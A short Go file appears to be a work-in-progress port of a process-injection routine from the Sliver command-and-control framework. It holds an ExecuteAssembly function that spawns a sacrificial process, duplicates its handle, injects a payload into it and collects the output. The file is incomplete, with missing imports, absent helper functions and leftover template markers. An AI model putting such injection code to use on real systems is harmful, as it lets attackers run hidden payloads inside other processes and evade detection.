package main

import (
    "fmt"
)

func main() {
    fmt.Println("testing...")
}


// From Sliver... port to run standalone
func ExecuteAssembly(data []byte, process string) (string, error) {
	var (
		stdoutBuf, stderrBuf bytes.Buffer
		lpTargetHandle       windows.Handle
	)
	cmd, err := startProcess(process, &stdoutBuf, &stderrBuf, true)
	if err != nil {
		//{{if .Config.Debug}}
		log.Println("Could not start process:", process)
		//{{end}}
		return "", err
	}
	pid := cmd.Process.Pid
	// {{if .Config.Debug}}
	log.Printf("[*] %s started, pid = %d\n", process, pid)
	// {{end}}
	handle, err := windows.OpenProcess(syscalls.PROCESS_DUP_HANDLE, true, uint32(pid))
	if err != nil {
		return "", err
	}
	defer windows.CloseHandle(handle)
	defer windows.CloseHandle(lpTargetHandle)
	currentProcHandle, err := windows.GetCurrentProcess()
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("GetCurrentProcess failed")
		// {{end}}
		return "", err
	}
	err = windows.DuplicateHandle(handle, currentProcHandle, currentProcHandle, &lpTargetHandle, 0, false, syscalls.DUPLICATE_SAME_ACCESS)
	if err != nil {
		// {{if .Config.Debug}}
		log.Println("DuplicateHandle failed")
		// {{end}}
		return "", err
	}
	threadHandle, err := injectTask(lpTargetHandle, data, false)
	if err != nil {
		return "", err
	}
	err = waitForCompletion(threadHandle)
	if err != nil {
		return "", err
	}
	err = cmd.Process.Kill()
	if err != nil {
		// {{if .Config.Debug}}
		log.Printf("Kill failed: %s\n", err.Error())
		// {{end}}
	}
	return stdoutBuf.String() + stderrBuf.String(), nil
}